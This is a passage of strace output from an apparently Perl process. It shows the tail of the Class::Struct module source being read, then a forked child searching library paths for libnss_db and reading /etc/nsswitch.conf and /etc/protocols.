\'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
5352  07:08:43.664732 _llseek(12, 6916, [6916], SEEK_SET) = 0
5352  07:08:43.664784 _llseek(12, 0, [6916], SEEK_CUR) = 0
5352  07:08:43.664810 close(12)         = 0
5352  07:08:43.665354 _llseek(11, 1334, [1334], SEEK_SET) = 0
5352  07:08:43.665402 _llseek(11, 0, [1334], SEEK_CUR) = 0
5352  07:08:43.665427 close(11)         = 0
5352  07:08:43.666419 brk(0x82ff000)    = 0x82ff000
5352  07:08:43.666574 _llseek(10, 2689, [2689], SEEK_SET) = 0
5352  07:08:43.666591 _llseek(10, 0, [2689], SEEK_CUR) = 0
5352  07:08:43.666602 close(10)         = 0
5352  07:08:43.666795 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7db7908) = 5353
5353  07:08:43.666890 getppid()         = 5352
5353  07:08:43.667217 open("/etc/nsswitch.conf", O_RDONLY) = 10
5353  07:08:43.667242 fstat64(10, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
5353  07:08:43.667263 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f7d000
5353  07:08:43.667277 read(10, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
5353  07:08:43.667330 read(10, "", 4096) = 0
5353  07:08:43.667341 close(10)         = 0
5353  07:08:43.667351 munmap(0xb7f7d000, 4096) = 0
5353  07:08:43.667379 open("/etc/ld.so.cache", O_RDONLY) = 10
5353  07:08:43.667393 fstat64(10, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5353  07:08:43.667411 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 10, 0) = 0xb7d84000
5353  07:08:43.667423 close(10)         = 0
5353  07:08:43.667434 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5353  07:08:43.667453 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667468 stat64("/lib/tls/i686/sse2/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.667483 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667515 stat64("/lib/tls/i686/sse2", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.667528 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667541 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5353  07:08:43.667560 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667573 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5353  07:08:43.667591 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667604 stat64("/lib/tls/sse2/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.667616 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667628 stat64("/lib/tls/sse2", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.667640 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667652 stat64("/lib/tls/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.667664 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667683 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5353  07:08:43.667701 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667714 stat64("/lib/i686/sse2/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.667726 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667739 stat64("/lib/i686/sse2", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.667750 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667763 stat64("/lib/i686/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.667774 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667786 stat64("/lib/i686", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.667797 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667810 stat64("/lib/sse2/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.667821 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667833 stat64("/lib/sse2", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.667844 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667857 stat64("/lib/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.667868 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667879 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5353  07:08:43.667897 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667911 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.667923 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667936 stat64("/usr/lib/tls/i686/sse2", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.667948 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667961 stat64("/usr/lib/tls/i686/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.667973 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.667996 stat64("/usr/lib/tls/i686", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668010 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668023 stat64("/usr/lib/tls/sse2/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668035 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668048 stat64("/usr/lib/tls/sse2", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668060 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668073 stat64("/usr/lib/tls/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668084 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668097 stat64("/usr/lib/tls", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668108 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668122 stat64("/usr/lib/i686/sse2/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668134 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668147 stat64("/usr/lib/i686/sse2", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668158 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668176 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5353  07:08:43.668195 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668208 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5353  07:08:43.668226 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668239 stat64("/usr/lib/sse2/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668251 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668263 stat64("/usr/lib/sse2", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668275 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668287 stat64("/usr/lib/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668299 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668311 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
5353  07:08:43.668328 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668343 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668356 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668370 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668383 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668397 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668409 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668423 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668435 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668449 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668462 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668475 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668499 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668514 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668527 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668540 stat64("/lib/i486-linux-gnu/tls", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668552 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668566 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668579 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668592 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668605 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668618 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668631 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668644 stat64("/lib/i486-linux-gnu/i686", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668656 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668673 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668686 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668699 stat64("/lib/i486-linux-gnu/sse2", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668711 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668724 stat64("/lib/i486-linux-gnu/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668737 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668750 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5353  07:08:43.668768 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668783 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668796 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668811 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668824 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668838 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668851 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668865 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668878 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668892 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668905 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668919 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668931 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668945 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.668958 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.668971 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.669659 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.669691 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.669739 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.669753 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.669766 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.669779 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.669792 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.669805 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.669817 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.669830 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.669859 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.669875 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.669887 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.669899 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfd2f1cc) = -1 ENOENT (No such file or directory)
5353  07:08:43.669911 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5353  07:08:43.669924 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5353  07:08:43.669945 munmap(0xb7d84000, 29913) = 0
5353  07:08:43.669966 open("/etc/ld.so.cache", O_RDONLY) = 10
5353  07:08:43.669987 fstat64(10, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5353  07:08:43.670004 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 10, 0) = 0xb7d84000
5353  07:08:43.670015 close(10)         = 0
5353  07:08:43.670025 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5353  07:08:43.670040 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 10
5353  07:08:43.670055 read(10, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5353  07:08:43.670144 fstat64(10, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
5353  07:08:43.670165 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 10, 0) = 0xb7d79000
5353  07:08:43.670177 mmap2(0xb7d82000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 10, 0x8) = 0xb7d82000
5353  07:08:43.670194 close(10)         = 0
5353  07:08:43.670217 munmap(0xb7d84000, 29913) = 0
5353  07:08:43.670233 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 10
5353  07:08:43.670249 fcntl64(10, F_GETFD) = 0x1 (flags FD_CLOEXEC)
5353  07:08:43.670264 fstat64(10, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
5353  07:08:43.670281 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d8b000
5353  07:08:43.670292 read(10, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
5353  07:08:43.670507 close(10)         = 0
5353  07:08:43.670537 munmap(0xb7d8b000, 4096) = 0
5353  07:08:43.670573 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 10
5353  07:08:43.670604 fstat64(10, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
5353  07:08:43.670620 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d8b000
5353  07:08:43.670631 read(10, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing 